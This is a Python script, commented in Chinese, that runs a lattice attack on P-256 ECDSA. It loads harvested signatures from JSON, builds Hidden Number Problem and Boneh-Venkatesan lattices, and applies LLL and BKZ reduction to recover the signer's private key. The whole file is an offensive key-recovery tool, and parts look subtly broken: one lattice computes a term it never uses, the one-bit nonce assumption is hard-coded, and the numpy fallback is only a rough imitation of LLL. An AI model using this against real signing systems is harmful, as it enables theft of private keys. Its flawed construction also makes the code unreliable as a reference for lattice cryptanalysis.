#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ECDSA格攻击实现
使用收集的签名进行私钥恢复
需要: pip install fpylll numpy
"""

import json
import sys
import numpy as np
from typing import List, Tuple, Optional

# 尝试导入fpylll
try:
    from fpylll import IntegerMatrix, LLL, BKZ
    from fpylll.tools.bkz_stats import dummy_tracer
    FPYLLL_AVAILABLE = True
except ImportError:
    print("[!] fpylll未安装，使用numpy实现简化版LLL")
    print("[!] 安装: pip install fpylll")
    FPYLLL_AVAILABLE = False

# P-256曲线参数
P256_N = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
P256_P = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF

class ECDSALatticeAttack:
    """ECDSA格攻击"""
    
    def __init__(self, curve_order: int = P256_N):
        self.n = curve_order
        self.signatures = []
        
    def add_signature(self, r: int, s: int, h: int, msb_known: int = 1):
        """
        添加签名
        r, s: 签名值
        h: 消息哈希（整数）
        msb_known: 已知的MSB位数
        """
        self.signatures.append({
            'r': r,
            's': s,
            'h': h,
            'msb_known': msb_known
        })
    
    def load_from_json(self, filename: str, fast_only: bool = True):
        """从JSON文件加载签名"""
        with open(filename, 'r') as f:
            data = json.load(f)
        
        count = 0
        if 'signatures' in data:
            for sig in data['signatures']:
                if isinstance(sig, dict) and 'r' in sig and 's' in sig:
                    r = int(sig['r'], 16) if isinstance(sig['r'], str) else sig['r']
                    s = int(sig['s'], 16) if isinstance(sig['s'], str) else sig['s']
                    
                    # 获取消息哈希
                    h = None
                    if 'h' in sig:
                        h = int(sig['h'], 16) if isinstance(sig['h'], str) else sig['h']
                    elif 'message_hash' in sig:
                        h = int(sig['message_hash'], 16) if isinstance(sig['message_hash'], str) else sig['message_hash']
                    
                    if h:
                        self.add_signature(r, s, h)
                        count += 1
        
        print(f"[+] 加载了 {count} 个签名")
        return count
    
    def construct_hnp_lattice(self, signatures: List[dict], msb_bits: int = 1) -> np.ndarray:
        """
        构造Hidden Number Problem格
        基于Boneh-Venkatesan方法
        """
        m = len(signatures)
        
        # 格维度 = m + 1
        L = np.zeros((m + 1, m + 1), dtype=object)
        
        # 计算t_i = r_i / s_i mod n
        # 计算u_i = -h_i / s_i mod n
        
        for i in range(m):
            sig = signatures[i]
            r, s, h = sig['r'], sig['s'], sig['h']
            
            # 模逆
            s_inv = pow(s, -1, self.n)
            
            t_i = (r * s_inv) % self.n
            u_i = (-h * s_inv) % self.n
            
            # 填充格矩阵
            # 对角线
            L[i][i] = self.n
            
            # 最后一列
            L[i][m] = t_i
        
        # 最后一行
        L[m][m] = 2 ** (256 - msb_bits)  # 利用MSB约束
        
        return L
    
    def construct_bv_lattice(self, signatures: List[dict], msb_bits: int = 1) -> np.ndarray:
        """
        构造Boneh-Venkatesan格（另一种构造方法）
        """
        m = len(signatures)
        
        # 格维度 = m + 2
        L = np.zeros((m + 2, m + 2), dtype=object)
        
        # 缩放因子
        scale = 2 ** (256 - msb_bits)
        
        for i in range(m):
            sig = signatures[i]
            r, s, h = sig['r'], sig['s'], sig['h']
            
            s_inv = pow(s, -1, self.n)
            t_i = (r * s_inv) % self.n
            u_i = (-h * s_inv) % self.n
            
            # 构造格
            L[i][i] = 2 * self.n
            L[i][m] = 2 * t_i
            L[i][m+1] = 2 * u_i + scale
        
        L[m][m] = 1
        L[m+1][m+1] = self.n
        
        return L
    
    def solve_with_fpylll(self, lattice: np.ndarray) -> Optional[int]:
        """使用fpylll求解"""
        if not FPYLLL_AVAILABLE:
            print("[-] fpylll不可用")
            return None
        
        print("[*] 使用fpylll进行格约简...")
        
        # 转换为fpylll格式
        m = lattice.shape[0]
        M = IntegerMatrix(m, m)
        
        for i in range(m):
            for j in range(m):
                M[i, j] = int(lattice[i][j])
        
        # LLL约简
        print("[*] 执行LLL约简...")
        LLL.reduction(M)
        
        # 尝试BKZ以获得更好的结果
        print("[*] 执行BKZ约简...")
        BKZ.reduction(M, BKZ.Param(block_size=20))
        
        # 检查短向量
        for i in range(m):
            row = [M[i, j] for j in range(m)]
            
            # 最后一个元素可能包含私钥
            possible_key = row[-1] % self.n
            
            if self.verify_private_key(possible_key):
                return possible_key
        
        return None
    
    def solve_with_numpy(self, lattice: np.ndarray) -> Optional[int]:
        """使用numpy的简化LLL（效果较差）"""
        print("[*] 使用numpy简化版LLL...")
        
        # Gram-Schmidt正交化
        def gram_schmidt(basis):
            orthogonal = []
            for v in basis:
                w = v.copy()
                for u in orthogonal:
                    w = w - np.dot(v, u) / np.dot(u, u) * u
                if np.linalg.norm(w) > 1e-10:
                    orthogonal.append(w)
            return orthogonal
        
        # 简化的LLL
        basis = lattice.astype(float)
        n = len(basis)
        
        for _ in range(10):  # 迭代次数
            # Gram-Schmidt
            ortho = gram_schmidt(basis)
            
            # Size reduction
            for i in range(n):
                for j in range(i):
                    mu = np.dot(basis[i], ortho[j]) / np.dot(ortho[j], ortho[j])
                    if abs(mu) > 0.5:
                        basis[i] = basis[i] - round(mu) * basis[j]
            
            # Swap condition
            for i in range(n - 1):
                if np.linalg.norm(basis[i]) > 1.5 * np.linalg.norm(basis[i + 1]):
                    basis[i], basis[i + 1] = basis[i + 1].copy(), basis[i].copy()
        
        # 检查结果
        for row in basis:
            possible_key = int(row[-1]) % self.n
            if self.verify_private_key(possible_key):
                return possible_key
        
        return None
    
    def verify_private_key(self, d: int) -> bool:
        """验证私钥是否正确"""
        if d == 0 or d >= self.n:
            return False
        
        # 使用几个签名验证
        for sig in self.signatures[:min(3, len(self.signatures))]:
            r, s, h = sig['r'], sig['s'], sig['h']
            
            # 计算 k = (h + d*r) / s mod n
            k = ((h + d * r) * pow(s, -1, self.n)) % self.n
            
            # k应该小于n且不为0
            if k == 0 or k >= self.n:
                return False
            
            # 如果我们假设MSB=0，检查k的大小
            if sig.get('msb_known', 0) > 0:
                if k >= 2 ** (256 - sig['msb_known']):
                    return False
        
        return True
    
    def attack(self, method: str = 'hnp') -> Optional[int]:
        """
        执行格攻击
        method: 'hnp' 或 'bv'
        """
        if len(self.signatures) < 100:
            print(f"[-] 签名数量不足: {len(self.signatures)}, 建议至少100个")
            return None
        
        print(f"[*] 使用 {len(self.signatures)} 个签名进行格攻击")
        print(f"[*] 方法: {method}")
        
        # 构造格
        if method == 'hnp':
            lattice = self.construct_hnp_lattice(self.signatures)
        else:
            lattice = self.construct_bv_lattice(self.signatures)
        
        print(f"[*] 格维度: {lattice.shape}")
        
        # 求解
        if FPYLLL_AVAILABLE:
            private_key = self.solve_with_fpylll(lattice)
        else:
            private_key = self.solve_with_numpy(lattice)
        
        if private_key:
            print(f"\n[!!!] 成功恢复私钥!")
            print(f"[!!!] d = {hex(private_key)}")
            return private_key
        else:
            print("\n[-] 未能恢复私钥")
            print("[*] 可能原因:")
            print("    1. 签名数量不足")
            print("    2. MSB假设不正确")
            print("    3. 需要更强的约简算法")
            return None

def main():
    """主函数"""
    if len(sys.argv) < 2:
        print("用法: python3 lattice_attack_ecdsa.py <签名文件.json>")
        print("示例: python3 lattice_attack_ecdsa.py ecdsa_signatures_fast_only.json")
        sys.exit(1)
    
    filename = sys.argv[1]
    
    print("="*60)
    print("ECDSA格攻击 - 私钥恢复")
    print("="*60)
    
    # 创建攻击器
    attacker = ECDSALatticeAttack()
    
    # 加载签名
    count = attacker.load_from_json(filename)
    
    if count < 50:
        print(f"[-] 签名太少({count}个)，建议至少50个")
        sys.exit(1)
    
    # 执行攻击
    print("\n[*] 开始格攻击...")
    
    # 尝试HNP方法
    print("\n--- Hidden Number Problem方法 ---")
    key1 = attacker.attack(method='hnp')
    
    if not key1:
        # 尝试BV方法
        print("\n--- Boneh-Venkatesan方法 ---")
        key2 = attacker.attack(method='bv')
        
        if key2:
            print(f"\n[成功] 私钥已恢复: {hex(key2)}")
    else:
        print(f"\n[成功] 私钥已恢复: {hex(key1)}")
    
    print("\n" + "="*60)

if __name__ == "__main__":
    main()